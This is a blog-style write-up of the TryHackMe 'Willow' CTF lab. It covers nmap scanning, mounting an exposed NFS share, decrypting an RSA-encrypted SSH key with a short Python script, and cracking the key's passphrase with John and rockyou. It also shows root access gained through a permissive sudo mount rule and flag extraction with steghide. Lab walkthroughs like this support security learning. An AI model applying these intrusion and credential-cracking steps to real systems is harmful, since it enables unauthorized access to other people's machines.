---
title: "TryHackMe - Willow writeup"
date: 2020-03-15
categories:
  - CTF
tags:
  - Python
  - RSA
  - CrackSSHKey
  - Steganography
---

This is a boot-to-root CTF from [TryHackMe](https://www.tryhackme.com/) and the CTF can be found @ https://www.tryhackme.com/room/willow. Key lessons learnt here: RSA algorithm, writing python functions to decrypt messages, cracking SSH key, steganography. 

![]({{ site.url }}{{ site.baseurl }}/assets/images/thm/willow/tryhackme_willow.png)

## Nmap Scan

First used `map -sC -sV 10.10.49.33 -o nmap/norm` for port discovery
```
PORT     STATE SERVICE VERSION                                                                             
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 43:b0:87:cd:e5:54:09:b1:c1:1e:78:65:d9:78:5e:1e (DSA)
|   2048 c2:65:91:c8:38:c9:cc:c7:f9:09:20:61:e5:54:bd:cf (RSA)
|   256 bf:3e:4b:3d:78:b6:79:41:f4:7d:90:63:5e:fb:2a:40 (ECDSA)
|_  256 2c:c8:87:4a:d8:f6:4c:c3:03:8d:4c:09:22:83:66:64 (ED25519)
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Recovery Page
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      32954/udp6  mountd
|   100005  1,2,3      34195/tcp6  mountd
|   100005  1,2,3      56899/tcp   mountd
|   100005  1,2,3      58807/udp   mountd
|   100021  1,3,4      38184/udp6  nlockmgr
|   100021  1,3,4      46092/udp   nlockmgr
|   100021  1,3,4      51207/tcp6  nlockmgr
|   100021  1,3,4      56448/tcp   nlockmgr
|   100024  1          41313/udp   status
|   100024  1          46157/tcp6  status
|   100024  1          50576/tcp   status
|   100024  1          56043/udp6  status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp open  nfs_acl 2-3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## OS/Software Versions

OpenSSH 6.7p1 Debian 5 (protocol 2.0)
Apache httpd 2.4.10 ((Debian))


## Mount (found juicy stuff!)

Since RPC port is showing some interesting stuff about nfs, trying `showmount` to see if theres anything to mount shows the following:
```
root@kali:~/gitlab_notes/thm/willow# showmount -e 10.10.49.33
Export list for 10.10.49.33:
/var/failsafe *
```

Seems like I could mount `/var/failsafe` so I did just that

```
root@kali:~/gitlab_notes/thm/willow# mount -vvv 10.10.49.33:/var/failsafe /mnt
mount.nfs: timeout set for Thu Mar 12 10:18:07 2020
mount.nfs: trying text-based options 'vers=4.2,addr=10.10.49.33,clientaddr=10.8.27.201'
mount.nfs: mount(2): Protocol not supported
mount.nfs: trying text-based options 'vers=4.1,addr=10.10.49.33,clientaddr=10.8.27.201'
```

After mounting it we can see that there is a file named `rsa_keys` and its contents showing that there are 2 'keys' each with 2 numbers. RSA uses prime numbers and that is a guess I had when thinking about what this numbers means, it is likely we May be able to use these numbers to get the RSA key (for decrypting something)
```
root@kali:~/gitlab_notes/thm/willow# cd /mnt
root@kali:/mnt# ls -lta
total 48
drwxr--r--  2 nobody nogroup  4096 Jan 30 11:31 .
-rw-r--r--  1 root   root       62 Jan 30 11:31 rsa_keys
drwxr-xr-x 19 root   root    36864 Jan 27 13:10 ..
root@kali:/mnt# cat rsa_keys
Public Key Pair: (23, 37627)
Private Key Pair: (61527, 37627)
```

## HTTP port 80 (Found juicy stuff!)
Navigating to port 80 shows us of what seem like wall of text consisting numbers

![]({{ site.url }}{{ site.baseurl }}/assets/images/thm/willow/http.png)

Could this be some hidden text that is 'encrypted'? I also noticed from this chunk of text that there are alphanumeric characters at the start, after which it is all digits. 

![]({{ site.url }}{{ site.baseurl }}/assets/images/thm/willow/hex_message.png)

Using the "cyberchef" online tool, turning this highlighted text from HEX will reveal the text `Hey Willow, here's your SSH Private key -- you know where the decryption key is!`. Bingo! This is definitely related to the public/private key pair found earlier. 

![]({{ site.url }}{{ site.baseurl }}/assets/images/thm/willow/converted_hex.png)

Next, I copied out the remaining text that are only digits (appended after the 'hex-ed' characters) into `decrypted.txt`. At this point I'm pretty sure that RSA algorithm is at play here, given that the hint given is just this url: [https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/](https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/) which is a RSA algorithm article written by the CTF creator.

From the article I tried to piece the information on how to decrypt a message using the RSA algorithm given the key pair we found. 
```
// From notes
Public Key: (e, n)
Private Key: (d, n)

// From what was found 
Public Key Pair: (23, 37627)
Private Key Pair: (61527, 37627)

n = 37627
d = 61527

// From notes, the formula to decrypt message
decrypted = (encrypted ** d) % n
```

Even though I have the decryption formula, I would not know what values to pass into this decyption formula to get a decrypted message eg. How many digits do I use for decrypting repetitively? Eg. What is the encrypted message format in? Well I know its numbers. 

## Analysing encrypted message
There is a hint from the message earlier that the cipher text would be a private SSH key. Looking at the format of an SSH key, we know that SSH keys content begin with `-----BEGIN RSA PRIVATE KEY-----`. 

So the encrypted text has a pattern here too, there are 5 blocks of `3233363720` that are repeated at the start which represents `-` character. Looking further, there will be the same 5 blocks digits that represents the closing `-----` characters. 

![]({{ site.url }}{{ site.baseurl }}/assets/images/thm/willow/analyse1.png)


I ran these digits through a python script to decrypt it using the formula `decrypted = (encrypted ** d) % n` but didn't get anything that made sense. I would assume the the decrypted value should be convertable to ASCII. I got something after doing some tests and found that there were "delimiters" which is represented by `20` (which turns out it is HEX for SPACE) Argh, I should have tried dumping the whole text into a HEX converter earlier and save all this trouble! Anothing verification that let me infer I am on thr right track is: when using sublime text, I was able to see recurring blocks when using highlight, for an instance, the character "E" in the text "PRIVATE KEY" happened 2 times and is represented by the digits `38363030`. 

![]({{ site.url }}{{ site.baseurl }}/assets/images/thm/willow/analyse2.png)


To test whether I was right, I ran the digits `38363030` which should be the encrypted character "E"  digits through a HEX converter (like CyberChef) and got `8600` back. Using our formula again (python) `(8600**61527)%37627` returned `69` which is ASCII for `E`. Bingo!

To decrypt for the SSH keys I wrote a simple script 
```python
encrypted = <dump all the digits here after converted from HEX>

n = 37627
d = 61527

rsakey = ""
for s in encrypted.split(" "):
	# formula
	# decrypt = (encrypted**d) % n
	decrypt = (int(s)**d) % n

	# convert number to ascii 
	rsakey += chr(decrypt)

print(rsakey)
```

![]({{ site.url }}{{ site.baseurl }}/assets/images/thm/willow/decrypt_success.png)


## Cracking SSH Key with John
Using ssh2john tool, prep the keys into a John readable format that will be used against a wordlist to crack it later `/usr/share/john/ssh2john.py rsa.key > id_rsa.hash`. 

Using John we can now crack the keys `john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash`

![]({{ site.url }}{{ site.baseurl }}/assets/images/thm/willow/ssh_cracked.png)


## Getting User

To SSH do change permission of the ssh key else there may be issues connecting. Using `-v` for verbose mode when login in will reveal this too.
```
chmod 600 rsa.key 
ssh willow@10.10.186.94 -i rsa.key
```
When prompted for passphrase, use the password cracked from private SSH Keys earlier.

![]({{ site.url }}{{ site.baseurl }}/assets/images/thm/willow/ssh_login.png)


Now that we are in! We see no flag but a `user.jpg`. Using scp copy out the file using and opening it revealed the first flag!
```bash
scp -i rsa.key willow@10.10.186.94:/home/willow/user.jpg /root/gitlab_notes/thm/willow/user.jpg
firefox user.jpg
```

## Privilege Escalation

Running `sudo -l` reveals that we can mount partition
```
willow@willow-tree:~$ sudo -l
Matching Defaults entries for willow on willow-tree:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User willow may run the following commands on willow-tree:
    (ALL : ALL) NOPASSWD: /bin/mount /dev/*
```

User is able to run `mount` as super user for `/dev/*` folders. Navigating to `/dev` directory listings show that there is a particular partition named `hidden_backup`. To mount this, I did the following:

```
willow@willow-tree:/dev$ mkdir /home/willow/hiddenbak
willow@willow-tree:/dev$ sudo mount /dev/hidden_backup /home/willow/hiddenbak
```

Navigating to mounted partition shows a file `creds.txt` contents seem like `root` password. Switch user to root using `su - root` and key in the password and we are greeted with `root.txt`. **Yes! I got the flag!** Or do we?

```
root@willow-tree:~# cat root.txt
This would be too easy, don't you think? I actually gave you the root flag some time ago.
You've got my password now -- go find your flag!
```

I'm half suspecting that the flag might be in the `user.jpg` file earlier. I went to `binwalk` it and `strings` it but found nothing interesting. Steganography is something I need to improve on. After googling any tools I could use, I went with `steghide` and had to install through `apt-get`

```
root@kali:~/gitlab_notes/thm/willow# steghide extract -sf user.jpg
Enter passphrase: 
wrote extracted data to "root.txt".
```

It was prompting a passphrase, I tried the passwords found in `creds.txt` earlier and found that `root` password allows me to extract (the real) `root.txt`. **Yes! I got the Real flag!** This is it! 

Lots of love and respect (and awe) for the CTF creator who is only 18 years old [MuirlandOracle](https://muirlandoracle.co.uk/), looking forward to doing more of his boot-to-roots.
